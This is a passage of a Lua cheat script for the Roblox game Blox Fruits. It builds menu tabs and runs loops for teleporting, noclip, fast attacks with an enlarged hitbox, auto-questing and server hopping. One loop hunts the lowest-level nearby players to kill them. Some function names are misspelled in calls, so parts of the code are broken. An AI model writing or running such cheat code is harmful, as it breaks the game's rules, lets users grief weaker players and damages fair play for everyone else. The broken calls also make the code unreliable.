    end
)
function IsSwanPirate()
    for i, v in pairs(game.Workspace.Enemies:GetChildren()) do
        if v.Name == "Swan Pirate [Lv. 775]" and v:FindFirstChild("Humanoid") and v.Humanoid.Health > 0 then
            return true
        end
    end
end
CountChest = 0
function GetPlayerLevelList(blacklists)
    memayto = {}
    for i, v in pairs(game.Players:GetChildren()) do
        pcall(
            function()
                if
                    v.Name ~= game.Players.LocalPlayer.Name and v:FindFirstChild("Data") and v.Data.Level and
                        (blacklists and not blacklists[v.Name]) and
                        v.Character and
                        (game.Players.LocalPlayer.Character.HumanoidRootPart.Position -
                            v.Character.HumanoidRootPart.Position).Magnitude <= 15000
                 then
                    memayto[v.Name] = v.Data.Level.Value
                end
            end
        )
    end
    return memayto
end
cc2 = {}
function getLowestLevelPlayer()
    if TargetedPlayer then
        return TargetedPlayer
    end
    cc = GetPlayerLevelList(cc2)
    min = 2450
    for i, v in pairs(cc) do
        if v < min then
            min = v
        end
    end
    for i, v in pairs(cc) do
        if v <= min then
            return i
        end
    end
end
function CheckCantAttackPlayer(v)
    for i, k in pairs(game.Players.LocalPlayer.PlayerGui.Notifications:GetDescendants()) do
        if k:IsA("TextLabel") then
            if string.find(k.Text, "attack") and not k:FindFirstChild(v.Name) then
                local BV = Instance.new("TextBox")
                BV.Parent = k.Parent
                BV.Name = v.Name
                k:Destroy()
                return true
            end
        end
    end
end
spawn(
    function()
        while wait() do
            if AutoTp and TpCFrame then
                pcall(
                    function()
                        if
                            (TpCFrame.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude >
                                300
                         then
                            pcall(
                                function()
                                    Tweento(TpCFrame * CFrame.new(0, math.random(1, 15), 0))
                                end
                            )
                        else
                            pcall(
                                function()
                                    if game.Players.LocalPlayer.Character.Stun.Value ~= 0 then
                                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                                            TpCFrame * CFrame.new(0, 100, 0)
                                        wait(1)
                                    else
                                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                                            TpCFrame * CFrame.new(0, math.random(1, 30), 0)
                                    end
                                end
                            )
                        end
                    end
                )
            end
        end
    end
)
spawn(
    function()
        while wait() do
            if ChoDienCanNguoi then
                if game.Players.LocalPlayer.PlayerGui.Main.PvpDisabled.Visible then
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("EnablePvp")
                    wait(5)
                end
            end
        end
    end
)
spawn(
    function()
        while wait() do
            if LegitAttack then
                pcall(
                    function()
                        ac = CombatFrameworkR.activeController
                        ac:attack()
                        AttackFunctgggggion()
                        ac.hitboxMagnitude = 55
                        wait(.5)
                    end
                )
            end
        end
    end
)
function Rejoin()
    game:GetService("TeleportService"):TeleportToPlaceInstance(
        game.PlaceId,
        game.JobId,
        game.Players.LocalPlayer
    )
end
function CheckKick(v)
    if v.Name == "ErrorPrompt" then
        if v.Visible then
            if v.TitleFrame.ErrorTitle.Text ~= "Teleport Failed" then
                game:GetService("TeleportService"):TeleportToPlaceInstance(
                    game.PlaceId,
                    game.JobId,
                    game.Players.LocalPlayer
                )
            end
        end
        v:GetPropertyChangedSignal("Visible"):Connect(
            function()
                if v.Visible then
                    if v.TitleFrame.ErrorTitle.Text ~= "Teleport Failed" then
                        game:GetService("TeleportService"):TeleportToPlaceInstance(
                            game.PlaceId,
                            game.JobId,
                            game.Players.LocalPlayer
                        )
                    end
                end
            end
        )
    end
end
game:GetService("CoreGui").RobloxPromptGui.promptOverlay.ChildAdded:Connect(CheckKick)
spawn(
    function()
        while wait() do
            if ChoDienCanNguoi then
                if TargetedPlayer or getLowestLevelPlayer() then
                    pcall(
                        function()
                            memay2 = game.Players[getLowestLevelPlayer()]
                            lonmemaytofake = lonmemayto
                            EnableBuso()
                            lonmemayto = "Melee"
                            EquipWeapon()
                            if not memay2 then
                                repeat
                                    wait()
                                    memay2 = game.Players:FindFirstChild(getLowestLelvelPlayer())
                                until memay2
                            end
                            repeat
                                TpCFrame =
                                    game.Players:FindFirstChild(getLowestLevelPlayer()).Character.HumanoidRootPart.CFrame
                                AutoTp = true
                                wait()
                                Noclip = true
                                if
                                    TpCFrame and
                                        (TpCFrame.Position -
                                            game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <
                                            300 and
                                        not game.Players.LocalPlayer.PlayerGui.Main.PvpDisabled.Visible
                                 then
                                    LegitAttack = true
                                    autospamskill = true
                                    AimBotSkillPosition = TpCFrame
                                    AimbotDiThangNgu = true
                                else
                                    LegitAttack = false
                                    autospamskill = nil
                                    AimbotDiThangNgu = true
                                    AimBotSkillPosition = nil
                                end --UseFastAttack = true
                            until not ChoDienCanNguoi or not getLowestLevelPlayer() or not ChoDienCanNguoi or not memay2 or
                                not game.Workspace.Characters:FindFirstChild(getLowestLevelPlayer()) or
                                not memay2.Character or
                                memay2.Character.Humanoid.Health <= 0 or
                                CheckCantAttackPlayer(memay2) or
                                cc2[getLowestLevelPlayer()]
                            cc2[getLowestLevelPlayer()] = true
                            autospamskill = false
                            LegitAttack = false
                            AimbotDiThangNgu = true
                            AimBotSkillPosition = nil
                            lonmemayto = lonmemaytofake
                            AutoTp = false
                            UseFastAttack = false
                            ----print("Turn Off Fast Attack9")
                        end
                    )
                elseif not getLowestLevelPlayer() then
                    cc2 = {}
                --HopServer()
                end
            end
        end
    end
)
spawn(
    function()
        while wait() do
            if AutoUpgradeRace then
                pcall(
                    function()
                        Stats_Melee = game:GetService("Players").LocalPlayer.Data.Stats.Melee.Level.Value
                    end
                )
                pcall(
                    function()
                        Stats_DF = game:GetService("Players").LocalPlayer.Data.Stats["Demon Fruit"].Level.Value
                    end
                )
                pcall(
                    function()
                        Stats_Gun = game:GetService("Players").LocalPlayer.Data.Stats.Gun.Level.Value
                    end
                )
                pcall(
                    function()
                        Stats_Sword = game:GetService("Players").LocalPlayer.Data.Stats.Sword.Level.Value
                    end
                )
                if Stats_Melee and Stats_Melee > 1 then
                    ToggleSpamMelee:Set(true)
                end
                if Stats_DF and Stats_DF > 1 then
                    ToggleSpamDF:Set(true)
                end
                if Stats_Sword and Stats_Sword > 1 then
                    ToggleSpamSword:Set(true)
                end
                if Stats_Gun and Stats_Gun > 1 then
                    ToggleSpamGun:Set(true)
                end
                Race = CheckRace()
                if not string.find(Race, "V3") and not string.find(Race, "V4") then
                    if not CheckSea(2) then
                        repeat
                            wait()
                            TeleportSea(2)
                            task.wait(10)
                        until CheckSea(2)
                    end
                end
                if string.find(Race, "V1") then
                    if
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(
                            "BartiloQuestProgress",
                            "Bartilo"
                        ) == 0
                     then
                        if
                            string.find(
                                game.Players.LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text,
                                "Swan Pirates"
                            ) and
                                string.find(
                                    game.Players.LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text,
                                    "50"
                                ) and
                                game.Players.LocalPlayer.PlayerGui.Main.Quest.Visible == true
                         then
                            if IsSwanPirate() then
                                for i, v in pairs(game.Workspace.Enemies:GetChildren()) do
                                    if
                                        v.Name == "Swan Pirate [Lv. 775]" and v:FindFirstChild("Humanoid") and
                                            v:FindFirstChild("HumanoidRootPart") and
                                            v.Humanoid.Health > 0
                                     then
                                        pcall(
                                            function()
                                                repeat
                                                    KillMob(v)
                                                until not v.Parent or v.Humanoid.Health <= 0 or
                                                    game.Players.LocalPlayer.PlayerGui.Main.Quest.Visible == false
                                                UseFastAttack = false
                                                ----print("Turn Off Fast Attack11")
                                            end
                                        )
                                    end
                                end
                            else
                                Questtween = Tweento(CFrame.new(1057.92761, 137.614319, 1242.08069))
                            end
                        else
                            Bartilotween = Tweento(CFrame.new(-456.28952, 73.0200958, 299.895966))
                            local args = {
                                [1] = "StartQuest",
                                [2] = "BartiloQuest",
                                [3] = 1
                            }
                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
                        end
                    elseif
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(
                            "BartiloQuestProgress",
                            "Bartilo"
                        ) == 1
                     then
                        Jeremy = CheckBoss("Jeremy [Lv. 850] [Boss]")
                        if Jeremy then
                            Target = ReturnBosses("Jeremy [Lv. 850] [Boss]")
                            if
                                game.Workspace.Enemies:FindFirstChild("Jeremy [Lv. 850] [Boss]") and
                                    Target:FindFirstChild("Humanoid") and
                                    Target.Humanoid.Health > 0
                             then
                                ----print("Turn Off Fast Attack12")
                                repeat
                                    wait()
                                    if Target:FindFirstChild("Humanoid") and Target.Humanoid.Health > 0 then
                                        KillMob(Target)
                                    end
                                until not AutoUpgradeRace or not Target or not Target:FindFirstChild("Humanoid") or
                                    not Target:FindFirstChild("HumanoidRootPart") or
                                    Target.Humanoid.Health <= 0
                                UseFastAttack = false
                            else
                                EnableBuso()
                                EquipWeapon()
                                Tweento(Target.HumanoidRootPart.CFrame * CFrame.new(0, 50, 0))
                            end
                        elseif Settings["HopOption"] then
                            Notify(nil, "Server Hop For Jeremy [Lv. 850] [Boss] ", 10)
                            HopServer()
                        end
                    elseif
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(
                            "BartiloQuestProgress",
                            "Bartilo"
                        ) == 2
                     then
                        StartCFrame =
                            CFrame.new(
                            -1837.46155,
                            44.2921753,
                            1656.19873,
                            0.999881566,
                            -1.03885048e-22,
                            -0.0153914848,
                            1.07805858e-22,
                            1,
                            2.53909284e-22,
                            0.0153914848,
                            -2.55538502e-22,
                            0.999881566
                        )
                        if
                            (StartCFrame.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude >
                                500
                         then
                            Tweento(StartCFrame)
                        else
                            game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame =
                                CFrame.new(-1836, 11, 1714)
                            wait(.5)
                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                                CFrame.new(-1850.49329, 13.1789551, 1750.89685)
                            wait(1)
                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                                CFrame.new(-1858.87305, 19.3777466, 1712.01807)
                            wait(1)
                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                                CFrame.new(-1803.94324, 16.5789185, 1750.89685)
                            wait(1)
                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                                CFrame.new(-1858.55835, 16.8604317, 1724.79541)
                            wait(1)
                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                                CFrame.new(-1869.54224, 15.987854, 1681.00659)
                            wait(1)
                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                                CFrame.new(-1800.0979, 16.4978027, 1684.52368)
                            wait(1)
                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                                CFrame.new(-1819.26343, 14.795166, 1717.90625)
                            wait(1)
                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                                CFrame.new(-1813.51843, 14.8604736, 1724.79541)
                        end
                    elseif
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(
                            "BartiloQuestProgress",
                            "Bartilo"
                        ) == 3
                     then
                        if
                            game.Players.LocalPlayer.Backpack:FindFirstChild("Flower 1") and
                                game.Players.LocalPlayer.Backpack:FindFirstChild("Flower 2") and
                                game.Players.LocalPlayer.Backpack:FindFirstChild("Flower 3")
                         then
                            if
                                (CFrame.new(-2777.6001, 72.9661407, -3571.42285).Position -
                                    game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude > 3
                             then
                                Farmtween = Tweento(CFrame.new(-2777.6001, 72.9661407, -3571.42285))
                                FakeFunctionsss = true
                            elseif
                                (CFrame.new(-2777.6001, 72.9661407, -3571.42285).Position -
                                    game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= 3
                             then
                                FakeFunctionsss = true
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("Alchemist", "3")
                                FakeFunctionsss = false
                            end
                        else
                            game.ReplicatedStorage.Remotes.CommF_:InvokeServer("Alchemist", "1")
                            game.ReplicatedStorage.Remotes.CommF_:InvokeServer("Alchemist", "2")
                            if
                                not game.Players.LocalPlayer.Backpack:FindFirstChild("Flower 1") and
                                    not game.Players.LocalPlayer.Character:FindFirstChild("Flower 1")
                             then
                                if workspace.Flower1.Transparency ~= 1 then
                                    Notify(nil, "Collecting Flower 1", 10)
                                    if
                                        (workspace.Flower1.Position -
                                            game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude >
                                            300
                                     then
                                        Farmtween = Tweento(workspace.Flower1.CFrame)
                                        FakeFunctionsss = true
                                    elseif
                                        (workspace.Flower1.Position -
                                            game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <=
                                            300
                                     then
                                        FakeFunctionsss = false
                                        if Farmtween then
                                            Farmtween:Stop()
                                        end
                                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                                            workspace.Flower1.CFrame * CFrame.new(20, 0, 20)
                                        FakeFunctionsss = false
                                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                                            workspace.Flower1.CFrame
                                        wait(1)
                                    end
                                elseif Settings["HopOption"] then
                                    if game.Lighting.ClockTime > 3 and game.Lighting.ClockTime < 16 then
                                        Notify("Script Stauts", "Hopping for Night", 10)
                                        HopServer()
                                    end
                                end
                            elseif
                                not game.Players.LocalPlayer.Backpack:FindFirstChild("Flower 2") and
                                    not game.Players.LocalPlayer.Character:FindFirstChild("Flower 2")
                             then
                                if workspace.Flower2.Transparency ~= 1 then
                                    Notify(nil, "Collecting Flower 2", 10)
                                    if
                                        (workspace.Flower2.Position -
                                            game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude >
                                            300
                                     then
                                        Farmtween = Tweento(workspace.Flower2.CFrame)
                                        FakeFunctionsss = true
                                    elseif
                                        (workspace.Flower2.Position -
                                            game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <=
                                            300
                                     then
                                        FakeFunctionsss = false
                                        if Farmtween then
                                            Farmtween:Stop()
                                        end
                                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                                            workspace.Flower2.CFrame * CFrame.new(20, 0, 20)
                                        FakeFunctionsss = false
                                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                                            workspace.Flower2.CFrame
                                        wait(1)
                                    end
                                end
                            elseif
                                not game.Players.LocalPlayer.Backpack:FindFirstChild("Flower 3") and
                                    not game.Players.LocalPlayer.Character:FindFirstChild("Flower 3")
                             then
                                Notify(nil, "Farming for Flower 3", 1.5)
                                if IsSwanPirate() then
                                    for i, v in pairs(game.Workspace.Enemies:GetChildren()) do
                                        if
                                            v.Name == "Swan Pirate [Lv. 775]" and v:FindFirstChild("Humanoid") and
                                                v.Humanoid.Health > 0
                                         then
                                            pcall(
                                                function()
                                                    repeat
                                                        KillMob(v)
                                                    until not AutoUpgradeRace or not v.Parent or v.Humanoid.Health <= 0 or
                                                        game.Players.LocalPlayer.Backpack:FindFirstChild("Flower 3") or
                                                        game.Players.LocalPlayer.Character:FindFirstChild("Flower 3")
                                                    UseFastAttack = false
                                                    ----print("Turn Off Fast Attack13")
                                                    FakeFunctionsss = false
                                                end
                                            )
                                        end
                                    end
                                else
                                    if
                                        (CFrame.new(1057.92761, 137.614319, 1242.08069).Position -
                                            game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude >
                                            300
                                     then
                                        Farmtween = Tweento(CFrame.new(1057.92761, 137.614319, 1242.08069))
                                    elseif
                                        (CFrame.new(1057.92761, 137.614319, 1242.08069).Position -
                                            game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <=
                                            300
                                     then
                                        if Farmtween then
                                            Farmtween:Stop()
                                        end
                                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                                            CFrame.new(1057.92761, 137.614319, 1242.08069)
                                    end
                                end
                            end
                        end
                    end
                else
                    if Race == "Human V2" then
                        ClaimQuestV3()
                        BossSpawned = {
                            ["Diamond [Lv. 750] [Boss]"] = CheckBoss("Diamond [Lv. 750] [Boss]"),
                            ["Fajita [Lv. 925] [Boss]"] = CheckBoss("Fajita [Lv. 925] [Boss]"),
                            ["Jeremy [Lv. 850] [Boss]"] = CheckBoss("Jeremy [Lv. 850] [Boss]")
                        }
                        sk = {}
                        for i, v in pairs(BossSpawned) do
                            if v then
                                table.insert(sk, i)
                            end
                        end
                        sk2 = "Server Have Bosses: "
                        for i, v in pairs(sk) do
                            sk2 = sk2 .. v .. ","
                        end
                        Notify(nil, sk2, 15)
                        if #sk < 3 and CheckRace() == "Human V2" and Settings["HopOption"] then
                            Notify(nil, "Hopping for 3 bosses", 15)
                            task.wait(1)
                            HopServer()
                        end
                        if #sk >= 3 then
                            for name, is in pairs(BossSpawned) do
                                Notify("Con me may thinh", CheckRace())
                                if is and CheckRace() == "Human V2" then
                                    Notify(nil, "Try Killing " .. name .. " Boss To Up Human V3")
                                    Target = ReturnBosses(name)
                                    repeat
                                        wait()
                                        if
                                            Target and game.Workspace.Enemies:FindFirstChild(Target.Name) and
                                                Target:FindFirstChild("Humanoid") and
                                                Target:FindFirstChild("HumanoidRootPart") and
                                                Target.Humanoid.Health > 0
                                         then
                                            KillMob(Target)
                                        elseif Target then
                                            EnableBuso()
                                            EquipWeapon()
                                            Tweento(Target.HumanoidRootPart.CFrame * CFrame.new(0, 50, 0))
                                        end
                                    until not AutoUpgradeRace or not Target or not Target:FindFirstChild("Humanoid") or
                                        not Target:FindFirstChild("HumanoidRootPart") or
                                        Target.Humanoid.Health <= 0
                                    UseFastAttack = false
                                ----print("Turn Off Fast Attack14")
                                end
                            end
                        end
                    elseif Race == "Skypiea V2" then
                        ClaimQuestV3()
                        SkypieaPlayers = {}
                        for i, v in pairs(game.Players:GetChildren()) do
                            pcall(
                                function()
                                    if
                                        v.Name ~= game.Players.LocalPlayer.Name and
                                            game.Workspace.Characters:FindFirstChild(v.Name) and
                                            v:FindFirstChild("Data") and
                                            v.Data:FindFirstChild("Race") and
                                            v.Data.Race.Value == "Skypiea" and
                                            v.Character:FindFirstChild("Humanoid")
                                     then
                                        table.insert(SkypieaPlayers, v)
                                    end
                                end
                            )
                        end
                        if #SkypieaPlayers > 0 then
                            for i, v in pairs(SkypieaPlayers) do
                                repeat
                                    wait()
                                    TargetedPlayer = v.Name
                                    ChoDienCanNguoi = true
                                until not v or not AutoUpgradeRace or
                                    game.Players.LocalPlayer.Data.Race.Value ~= "Skypiea" or
                                    string.find(CheckRace(), "V3")
                                ChoDienCanNguoi = nil
                                TargetedPlayer = nil
                            end
                        else
                            HopServer(9)
                            HopServer(10)
                        end
                    elseif Race == "Fishman V2" then
                        ClaimQuestV3()
                        repeat
                            wait()
                            SeaBeastToggle:Set(true)
                            wait(1)
                        until not AutoUpgradeRace or not CheckRace() == "Fishman V2" or
                            not string.find(CheckRace(), "Fish")
                        SeaBeastToggle:Set(false)
                    elseif Race == "Ghoul V2" then
                        ClaimQuestV3()
                        repeat
                            wait()
                            ChoDienCanNguoi = true
                            wait(1)
                        until not AutoUpgradeRace or game.Players.LocalPlayer.Data.Race.Value ~= "Ghoul" or
                            string.find(CheckRace(), "V3")
                        ChoDienCanNguoi = false
                    elseif Race == "Cyborg V2" then
                        ClaimQuestV3()
                        if not AnyDFInBackpack() then
                            repeat
                                wait()
                                p = getFruitDuoi1M()
                                if p then
                                    LoadFruit(p)
                                end
                            until AnyDFInBackpack()
                            UpV3NoTween()
                        end
                    elseif Race == "Mink V2" then
                        ClaimQuestV3()
                        local Chest = GetNearestChest()
                        if Chest and Race ~= "Mink V3" then
                            Tweento(Chest)
                            CountChest = CountChest + 1
                            Notify("Script Status", "Remaning " .. (30 - CountChest) .. " Chest", 7.5)
                            if CountChest >= 30 then
                                UpV3NoTween()
                                Notify(
                                    nil,
                                    "Race Status: " ..
                                        tostring(
                                            game.ReplicatedStorage.Remotes.CommF_:InvokeServer("Wenlocktoad", "info")
                                        )
                                )
                            end
                        elseif Chest == nil then
                            repeat
                                wait()
                                local Chest = GetNearestChest()
                            until Chest ~= nil
                        end
                    end
                    if string.find(Race, "V3") or string.find(Race, "V4") then
                        AutoUpgradeRace_Toggle:Set(false)
                    end
                end
            end
        end
    end
)
if Sea3 then
    local WebhookTab =
        Window:MakeTab(
        {
            Name = "Webhook",
            Icon = "rbxassetid://4483345998",
            PremiumOnly = false
        }
    )
    WebhookTab:AddTextbox(
        {
            Name = "Webhook Url",
            Default = Settings["WebhookUrl"],
            TextDisappear = true,
            Callback = function(Value)
                Notify("Script Status", "Inputed Url: " .. Value .. "!")
                SaveSettings("WebhookUrl", Value)
            end
        }
    )
    WebhookTab:AddButton(
        {
            Name = "Test Webhook",
            Callback = function()
                PostWebhook(Settings["WebhookUrl"], GetMsgTest())
            end
        }
    )
    WebhookTab:AddToggle(
        {
            Name = "Send Message When Mirage Found",
            Default = Settings["WebhookWhenMirage"],
            Callback = function(Value)
                SaveSettings("WebhookWhenMirage", Value)
            end
        }
    )
    WebhookTab:AddToggle(
        {
            Name = "Send Message When Moon 3/4 Or 4/4 Found",
            Default = Settings["WebhookWhenMoon"],
            Callback = function(Value)
                SaveSettings("WebhookWhenMoon", Value)
            end
        }
    )
    WebhookTab:AddToggle(
        {
            Name = "Ping @Everyone",
            Default = Settings["PingEveryone"],
            Callback = function(Value)
                SaveSettings("PingEveryone", Value)
            end
        }
    )
    WebhookTab:AddLabel("                               Roblox Account Manager      ")
    WebhookTab:AddSlider(
        {
            Name = "RAM Track Delay",
            Min = 30,
            Max = 240,
            Default = Settings["RAM_Track_Delay"],
            Color = Color3.fromRGB(255, 255, 255),
            Increment = 1,
            ValueName = "Value",
            Callback = function(Value)
                SaveSettings("RAM_Track_Delay", Value)
            end
        }
    )
    WebhookTab:AddToggle(
        {
            Name = "RAM Track",
            Default = Settings["RAM_Track"],
            Callback = function(mmb)
                SaveSettings("RAM_Track", mmb)
            end
        }
    )
    WebhookTab:AddButton(
        {
            Name = "Check Your RAM Can Set?",
            Callback = function()
                local RAMPANEL = RAMAccount.new(game:GetService "Players".LocalPlayer.Name)
                if RAMPANEL then
                    return Notify(nil, "Your RAM can set info....")
                end
                Notify(nil, "Your RAM can not set info...")
            end
        }
    )
end
if not Sea1 then 
    RaidTab =
        Window:MakeTab(
        {
            Name = "Raid",
            Icon = MoonTextureId(),
            PremiumOnly = false
        }
    )
end
local SettingTab =
    Window:MakeTab(
    {
        Name = "Setting",
        Icon = MoonTextureId(),
        PremiumOnly = false
    }
)
SettingTab:AddToggle(
    {
        Name = "Hop Option",
        Default = Settings["HopOption"],
        Save = false,
        Callback = function(asasasas)
            if asasasas then 
                print('hop option = truruu')
            end
            SaveSettings("HopOption", asasasas)
        end
    }
)

SettingTab:AddSlider(
    {
        Name = "Edit Tween Speed",
        Min = 100,
        Max = 350,
        Default = Settings["Tween Speed"],
        Color = Color3.fromRGB(255, 255, 255),
        Increment = 1,
        ValueName = "Per Second",
        Callback = function(Value)
            TweenSpeed = Value
            SaveSettings("Tween Speed", Value)
        end
    }
)
SettingTab:AddSection({Name = "Fast Attack Settings"})
FastAttackSetting2 = SettingTab:AddSlider(
    {
        Name = "Cooldown After attack time: ",
        Min = 10,
        Max = 100,
        Default = Settings["CDAAT"],
        Color = Color3.fromRGB(255, 255, 255),
        Increment = 1,
        ValueName = "Value",
        Callback = function(Value)
            SaveSettings("CDAAT", Value)
        end
    }
)
FastAttackSetting1 = SettingTab:AddSlider(
    {
        Name = "Time to wait when cooldown",
        Min = 7,
        Max = 20,
        Default = Settings["TimeWait"],
        Color = Color3.fromRGB(255, 255, 255),
        Increment = 1,
        ValueName = "Value",
        Callback = function(Value)
            SaveSettings("TimeWait", Value)
        end
    }
)
SettingTab:AddSlider(
    {
        Name = "Delay when cooldown (work with mastery)",
        Min = 0.1,
        Max = 2,
        Default = Settings["DelayAttack"] or 0.35,
        Color = Color3.fromRGB(255, 255, 255),
        Increment = 0.1,
        ValueName = "Second",
        Callback = function(Value)
            SaveSettings("DelayAttack", Value)
        end
    }
)
SettingTab:AddSection({Name = "ETC..."})
Teams = {
    "Pirate",
    "Marine"
}
SettingTab:AddDropdown(
    {
        Name = "Select Team Will Auto Choose",
        Default = Settings["Team"],
        Options = Teams,
        Callback = function(Value)
            SaveSettings("Team", Value)
        end
    }
)
SettingTab:AddSlider(
    {
        Name = "Delay Of Hop",
        Min = 1,
        Max = 15,
        Default = Settings["Hop Delay"],
        Color = Color3.fromRGB(255, 255, 255),
        Increment = 1,
        ValueName = "Value",
        Callback = function(Value)
            SaveSettings("Hop Delay", Value)
        end
    }
)
SettingTab:AddToggle({
    Name = "White Screen",
    Default = Settings["White Screen"],
    Callback = function(g)
        SaveSettings("White Screen",g)
    end
})
spawn(function() while task.wait() do if Settings["White Screen"] then game:GetService("RunService"):Set3dRenderingEnabled(false) else game:GetService("RunService"):Set3dRenderingEnabled(true) end end end)
SettingTab:AddToggle(
    {
        Name = "Panic Mode",
        Default = Settings["Panic Mode"],
        Callback = function(Value)
            SaveSettings("Panic Mode", Value)
        end
    }
)
SettingTab:AddSection({Name = "Auto Spam Skill"})
SettingTab:AddToggle(
    {
        Name = "Auto Spam Skill",
        Default = Settings["Auto Spam Skill"],
        Callback = function(Value)
            autospamskill = Value
            SaveSettings("Auto Spam Skill", Value)
        end
    }
)
ToggleSpamGun =
    SettingTab:AddToggle(
    {
        Name = "Toggle Auto Spam Skill: Gun",
        Default = Settings["Spam_Gun"],
        Callback = function(Value)
            SaveSettings("Spam_Gun", Value)
        end
    }
)
ToggleSpamSword =
    SettingTab:AddToggle(
    {
        Name = "Toggle Auto Spam Skill: Sword",
        Default = Settings["Spam_Sword"],
        Callback = function(Value)
            SaveSettings("Spam_Sword", Value)
        end
    }
)
ToggleSpamDF =
    SettingTab:AddToggle(
    {
        Name = "Toggle Auto Spam Skill: Devil Fruit",
        Default = Settings["Spam_DF"],
        Callback = function(Value)
            SaveSettings("Spam_DF", Value)
        end
    }
)
ToggleSpamMelee =
    SettingTab:AddToggle(
    {
        Name = "Toggle Auto Spam Skill: Melee",
        Default = Settings["Spam_Melee"],
        Callback = function(Value)
            SaveSettings("Spam_Melee", Value)
        end
    }
)

task.spawn(
    function()
        while task.wait() do
            if Settings["Panic Mode"] then
                pcall(
                    function()
                        LowHealth = game.Players.LocalPlayer.Character.Humanoid.MaxHealth * 30 / 100
                        NotLowHealth = game.Players.LocalPlayer.Character.Humanoid.MaxHealth * 70 / 100
                        if Settings["Panic Mode"] and game.Players.LocalPlayer.Character.Humanoid.Health <= LowHealth then
                            pcall(
                                function()
                                    CancelTween()
                                end
                            )
                            OldY = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.Y
                            repeat
                                wait()
                                AntiLowHealth(math.random(1000, 10000))
                            until not Settings["Panic Mode"] or
                                not game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") or
                                game.Players.LocalPlayer.Character.Humanoid.Health > NotLowHealth
                            AntiLowHealth(OldY)
                        end
                    end
                )
            end
        end
    end
)
function u9(f)
    return "```" .. tostring(f) .. "```"
end
function sizepart(v)
    --[[
            if not syn then
        return ----print("Not synx")
    end
    pcall(
        function()
            v.HumanoidRootPart.CanCollide = false
            v.Humanoid:ChangeState(11)
            if not v.HumanoidRootPart:FindFirstChild("vando") then
                local lock = Instance.new("BodyVelocity")
                lock.Parent = v
                lock.Name = "vando"
                lock.Size = Vector3.new(100000, 100000, 100000)
                lock.MaxForce = Vector3.new(100000, 100000, 100000)
                lock.Velocity = Vector3.new(0, 0, 0)
                lock.CanCollide = true
            end
        end
    )
    ]]
end
function EnableKen()
    if
        game:GetService("Players").LocalPlayer:FindFirstChild("PlayerGui") and
            game.Players.LocalPlayer.PlayerGui:FindFirstChild("ScreenGui") and
            game.Players.LocalPlayer.PlayerGui.ScreenGui:FindFirstChild("ImageLabel")
     then
    else
        wait(1)
        game:service("VirtualUser"):CaptureController()
        game:service("VirtualUser"):SetKeyDown("0x65")
        wait(2)
        game:service("VirtualUser"):SetKeyUp("0x65")
    end
end
function CheckPirateBoat()
    local PirateBoats = {
        "PirateBasic",
        "PirateBrigade"
    }
    for i, v in next, game:GetService("Workspace").Enemies:GetChildren() do
        if table.find(PirateBoats, v.Name) and v:FindFirstChild("Health") and v.Health.Value > 0 then
            return v
        end
    end
end
spawn(
    function()
        function Seabeast()
            if not checkseabeast() and not CheckPirateBoat() then
                if not checkboat() then
                    if
                        (Vector3.new(-13.488054275512695, 10.311711311340332, 2927.69287109375) -
                            game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 8
                     then
                        getgenv().noclip = true
                        Tweento(CFrame.new(-13.488054275512695, 10.311711311340332, 2927.69287109375))
                    else
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyBoat", "PirateBasic")
                    end
                else
                    if (checkboat().VehicleSeat.Position - Vector3.new(28.4108, 1.2327, 3679.99)).Magnitude > 50 then
                        checkboat().VehicleSeat.CFrame = CFrame.new(28.4108 + 20, 1.2327 + 10, 3679.99 + 20)
                    else
                        if not game:GetService("Players").LocalPlayer.Character.Humanoid.Sit then
                            if
                                (checkboat().VehicleSeat.Position -
                                    game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position).Magnitude >
                                    50
                             then
                                NoClip = true
                                Tweento(checkboat().VehicleSeat.CFrame)
                                NoClip = true
                            else
                                NoClip = false
                                game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame =
                                    checkboat().VehicleSeat.CFrame
                            end
                        end
                    end
                end
            elseif CheckPirateBoat() then
                local v = CheckPirateBoat()
                repeat
                    wait()
